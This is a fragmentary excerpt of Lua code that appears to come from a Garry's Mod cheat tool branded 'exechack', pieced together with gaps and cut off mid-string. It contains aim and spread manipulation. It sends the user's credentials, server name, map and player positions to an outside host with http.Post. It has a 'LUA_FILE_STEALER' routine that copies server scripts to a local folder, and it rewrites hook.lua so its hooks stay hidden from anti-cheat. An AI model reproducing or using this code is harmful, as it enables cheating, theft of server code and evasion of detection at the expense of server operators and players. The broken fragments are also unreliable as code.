...
local d={start=_pm_GetShootPos(me),endpos=c,mask=MASK_SHOT,filter=function(e)return !_em_IsPlayer(e)end}
...
local ang = GetAngle(ang)
if cone then
if base=="fas2_base"then
math.randomseed(servertime) print(servertime)
else
...
http.Post("https://exechack.cc/hacka/cloudradar.php",{log = "]]..username..[[",pass = "]]..password..[[",server = GetHostName(),map = game.GetMap(),pos = util.TableToJSON(radar(maps[game.GetMap()]))})
end
end
...
]]end;if IsInGame()and o[1]and a==o[1]["name"]then return o[1]["code"]end;if GetHostName:find("PrimeRP")and IsInGame()then return k end;if GetHostName:find("CakeRP")and IsInGame()then return k end;if GetHostName:find("FustRP")and IsInGame()then return k end;if t["LUA_FILE_STEALER"]and not ScriptExistsif and not IsInGame()and GetHostName then local X=string.Replace("C:/exechack",[[\]],[[/]])local Y=string.Explode("/",a)local l=X.."/"..GetHostName.."/"exec_CreateDir("C:/exechack")exec_CreateDir("C:/exechack".."/"..GetHostName)for d=1,#Y-1 do l=l..Y[d]if not exec_Exists(l)then exec_CreateDir(l)end;l=l.."/"end;if exec_Exists(X.."/"..GetHostName.."/"..a)then local Z=exec_Read(X.."/"..GetHostName.."/"..a)exec_Write(X.."/"..GetHostName.."/"..a,Z.."\n"..R)else exec_Write(X.."/"..GetHostName.."/"..a,R)end end;if j and s then return" "end;if a=="lua/includes/modules/hook.lua"then return R:Replace("function GetTable() return Hooks end",[[
function GetTable()
local tab={}
